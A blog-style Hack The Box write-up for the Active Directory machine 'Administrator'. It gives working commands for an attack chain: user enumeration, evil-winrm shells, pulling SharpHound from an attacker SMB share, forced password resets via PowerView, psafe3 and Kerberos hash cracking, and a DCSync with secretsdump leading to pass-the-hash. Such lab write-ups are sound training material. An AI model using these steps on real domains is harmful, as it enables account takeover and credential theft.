@@ -1,0 +1,289 @@
+I"
+D<p>Hey everyone, today I want to explore a medium machine on HTB called Administrator.
+The main themes that persists throughout this box are AD privilege mismanagement abuse to gain increasingly privileged users, with some password cracking thrown into the mix.
+This was a very strange release coming from HTB, as I’ve not seen OSCP-like boxes in a very long time, but I’ll touch more on that in the conclusion.</p>
+
+<p>Unlike many HTB boxes, we actually start out with credentials to the domain for a user account <code class="language-plaintext highlighter-rouge">olivia</code> with the password <code class="language-plaintext highlighter-rouge">ichliebedich</code> (sidenote, that translates to I love you in german, how nice of them!)</p>
+
+<h2 id="foothold">Foothold</h2>
+
+<p>I started out by running a normal port scan <code class="language-plaintext highlighter-rouge">nmap -sV -T5 administrator.htb</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre>21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-04 21:45:35Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>At first glance this looks very normal apart from the FTP service that we should keep in mind for later.
+While this box never required use of a user list as spraying is not apart of the solution, I did try it during the solve:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>┌──(root㉿kali)-[~/htb/Machines/Medium/Administrator]
+└─# netexec smb Administrator.htb -u Olivia -p ichliebedich --users | awk -F '               ' '{print $2}' &gt; users.txt
+...
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I tried a couple things at first, spraying the password for other users, seeing if I can log into FTP, etc, but I soon remembered a small quirk of nmap when not scanning specific ports - it doesn’t scan the WinRM port! Sure enough after a full nmap port scan (<code class="language-plaintext highlighter-rouge">nmap -p- -T5 Administrator.htb</code>), WinRM revealed itself and we can log in with our given user account to gain a shell.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>┌──(root㉿kali)-[~/htb/Machines/Medium/Administrator]
+└─# evil-winrm -i administrator.htb -u olivia -p ichliebedich                                                                                                                       
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\olivia\Documents&gt; 
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="olivia---michael">Olivia -&gt; Michael</h2>
+
+<p>Enumerating over the machine itself did not prove useful, there wasn’t anything interesting I could access but even if I could the machine seemed very empty. Given that the machine is mostly empty and we know it’s a domain, I assumed this is going to be an AD machine, so I booted up BloodHound and got to collecting some data.</p>
+
+<p>This is a good interlude to introduce a tool I’ve scripted called <code class="language-plaintext highlighter-rouge">startsmb</code>, which really saves you the hastle of moving files to and from kali and a windows host, this tool can be found on my github in pentest utils but in essence, it creates an SMB instance and copies the command you need to add it, very convinient in this box as we’ll be using it quite often.
+<img src="/assets/image/2025-01-05/341188909-4ab7feaa-5e2b-440a-b111-2629bfd82646.png" alt="startsmbScript" /></p>
+
+<p>Now all we need to do is bring in sharphound, collect our data and move it back to our kali machine.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\olivia&gt; net use w: \\10.10.14.113\archer /user:kali kali
+*Evil-WinRM* PS C:\Users\olivia&gt; copy W:\SharpHound.exe .
+*Evil-WinRM* PS C:\Users\olivia&gt; .\SharpHound.exe -c all
+*Evil-WinRM* PS C:\Users\olivia&gt; copy 202* W:\
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Now that we’ve gathered our data, we can check if Olivia has any special privileges, and sure enough when looking at first degree object control, it seems like Olivia has <code class="language-plaintext highlighter-rouge">GenericAll</code> rights over <code class="language-plaintext highlighter-rouge">MICHAEL@ADMINISTRATOR.HTB</code>, this right allows us to force change the target user’s password, so let’s get to doing that</p>
+
+<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="nf">PS</span> <span class="nf">C:\...</span><span class="p">&gt;</span> <span class="nf">import-module</span> <span class="nf">.\PowerView.ps1</span>
+
+<span class="nf">PS</span> <span class="nf">C:\...</span><span class="p">&gt;</span> <span class="nf">$UserPassword</span> <span class="nf">=</span> <span class="nf">ConvertTo-SecureString</span> <span class="nf">'Password123!'</span> <span class="nf">-AsPlainText</span> <span class="nf">-Force</span>
+<span class="nf">PS</span> <span class="nf">C:\...</span><span class="p">&gt;</span> <span class="nf">Set-DomainUserPassword</span> <span class="nf">-Identity</span> <span class="nf">Michael</span> <span class="nf">-AccountPassword</span> <span class="nf">$UserPassword</span> 
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We can confirm this worked via netexec:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>┌──(root㉿kali)-[~/htb/Machines/Medium/Administrator]
+└─# netexec winrm administrator.htb -u michael -p 'Password123!'
+WINRM       10.129.81.221   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
+WINRM       10.129.81.221   5985   DC               [+] administrator.htb\michael:Password123! (Pwn3d!)
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="michael---benjamin">Michael -&gt; Benjamin</h2>
+<p>Similarly to Olivia, Michael can log in with WinRM and when following the same steps to see what object control Michael has, the account can force change the password of <code class="language-plaintext highlighter-rouge">BENJAMIN@ADMINISTRATOR.HTB</code></p>
+
+<p>we’ll follow the same steps as we did before, copy over PowerView, import it and use it to change the password of Benjamin:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\michael\documents&gt; net use w: \\10.10.14.113\archer /user:kali kali
+The command completed successfully.
+*Evil-WinRM* PS C:\Users\michael\documents&gt; copy W:\PowerView.ps1 .
+*Evil-WinRM* PS C:\Users\michael\documents&gt; import-module .\PowerView.ps1
+
+*Evil-WinRM* PS C:\Users\michael\documents&gt; $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\michael\documents&gt; Set-DomainUserPassword -Identity Benjamin -AccountPassword $UserPassword
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="benjamin---emily-user-flag">Benjamin -&gt; Emily (User flag)</h2>
+<p>2 user pivots and no user flag! Well, we have to keep going.
+Going over Benjamin we run into a pitstop, we cannot log into WinRM and the account doesn’t seem to have any obvious dangerous privileges over other users.</p>
+
+<p>When debating over what I should do I thought I should give FTP another try with the users I pwned, which ended up working for Benjamin (with our changed password of <code class="language-plaintext highlighter-rouge">Password123!</code>).
+There I found a file <code class="language-plaintext highlighter-rouge">Backup.psafe3</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre>┌──(root㉿kali)-[~/htb/Machines/Medium/Administrator]
+└─# ftp benjamin@administrator.htb 
+Connected to administrator.htb.
+220 Microsoft FTP Service
+331 Password required
+Password: Password123!
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||55541|)
+125 Data connection already open; Transfer starting.
+10-05-24  08:13AM                  952 Backup.psafe3
+226 Transfer complete.
+ftp&gt; 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>While I’ve never had the luxury of cracking a <code class="language-plaintext highlighter-rouge">psafe3</code> file, it follows a very similar path to a <code class="language-plaintext highlighter-rouge">kdbx</code> file, which I’ve cracked alot of. For <code class="language-plaintext highlighter-rouge">psafe3</code>, we can use <code class="language-plaintext highlighter-rouge">pwsafe2john</code> to get the hash of the file and crack it using <code class="language-plaintext highlighter-rouge">john</code>.</p>
+
+<p>Small note: My kali runs on a VM therefore when cracking I always switch to my main rig, so cracking is done on windows, with <code class="language-plaintext highlighter-rouge">john</code> I find it simpler to use the GUI to crack.</p>
+
+<p>John correctly identified the hash and I cracked it with <code class="language-plaintext highlighter-rouge">rockyou.txt</code>:
+<img src="/assets/image/2025-01-05/image.png" alt="CrackingPWSAFEHash" /></p>
+
+<p>We get the passphrase of <code class="language-plaintext highlighter-rouge">tekieromucho</code>, which much like our olivia password, also means I love you but this time in spanish!</p>
+
+<p>Anyways, now that we can open the backup file, we get a hit on Emily’s password and can get a shell with WinRM and get the <code class="language-plaintext highlighter-rouge">user.txt</code> flag.</p>
+
+<h2 id="emily---ethan">Emily -&gt; Ethan</h2>
+<p>Going back to BloodHound, this time we can see a clear path to victory using the Shortest Paths to DA from Owned Principles analysis:
+<img src="/assets/image/2025-01-05/image2.png" alt="alt text" /></p>
+
+<p>Let’s start with a <code class="language-plaintext highlighter-rouge">GenericWrite</code> privilege over the Ethan account. Contrary to what the name suggests, we cannot write over <em>any</em> property of Ethan (namely, force changing his password) but we can perform a targeted kerberoast to get his password hash and try to crack it.</p>
+
+<p>we’ll be using <a href="https://github.com/ShutdownRepo/targetedKerberoast">this</a> tool with the suggested command from bloodhound:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>┌──(root㉿kali)-[~/…/Machines/Medium/Administrator/targetedKerberoast]
+└─# python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -f hashcat 
+
+&lt;...&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>If you get a clock skew error, you have to manually set your time to match the machine:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>┌──(root㉿kali)-[~/…/Machines/Medium/Administrator/targetedKerberoast]
+└─# timedatectl set-ntp off     
+┌──(root㉿kali)-[~/…/Machines/Medium/Administrator/targetedKerberoast]
+└─# rdate -n administrator.htb
+Sat Jan  4 18:25:08 EST 2025
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>After getting the hash, we can crack it using hashcat:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>&gt;hashcat -a 0 -m 13100 hashes\administrator.krb5.hash rockyou.txt
+...
+&lt;hash&gt;:limpbizkit
+...
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>and of course confirm we successfully pwned the user!
+<img src="/assets/image/2025-01-05/Pasted%20image%2020250104182816.png" alt="pwned ethan" /></p>
+
+<h2 id="ethan---root">Ethan -&gt; Root</h2>
+<p>Alright, we’re very close! A DCSync attack will net us the administrator NTLM hash which we can use to log in with WinRM!
+To perform the attack we’ll use <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code> with the following command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>┌──(root㉿kali)-[~/…/Machines/Medium/Administrator/targetedKerberoast]
+└─# impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'administrator.htb'
+...
+Administrator:500:XXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXX:::
+...
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>We successfully get the NTLM hash of the administrator and we can now log in to the machine.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td><td class="rouge-code"><pre>┌──(root㉿kali)-[~/…/Machines/Medium/Administrator/targetedKerberoast]
+└─# evil-winrm -i administrator.htb -u administrator -H 'XXXXXXXXXXXX'
+
+...
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
+*Evil-WinRM* PS C:\Users\Administrator&gt; cd desktop
+*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; dir
+
+
+    Directory: C:\Users\Administrator\desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---          1/4/2025   1:44 PM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; type root.txt
+xxxxxxxxxxxxxxxxxxxxxxx
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="conclusion--thoughts">Conclusion &amp; Thoughts</h2>
+<p>This box is a very classic OSCP-Like box, it’s clear and concise, I never felt lost and always saw the next step very clearly. This is a great box if you’re new to AD and want to practice some classic AD privilege mismanagement. For me, this box felt a little too clear. I would’ve loved if there was some service I needed to exploit instead of resetting a password a second time to escalate to a different user or maybe an automated task run as Benjamin. The difficulty of the medium rating given to the machine is mostly in the number of steps, not the exploitation itself.</p>
+
+<p>Though I must admit, sometimes HTB can be very difficult and obscure in it’s exploitation paths so this box was definitely positively refreshing after pwning UnderPass!</p>
+
+<p>More writeups will come in the future, hope you enjoyed your read!</p>
+:ET
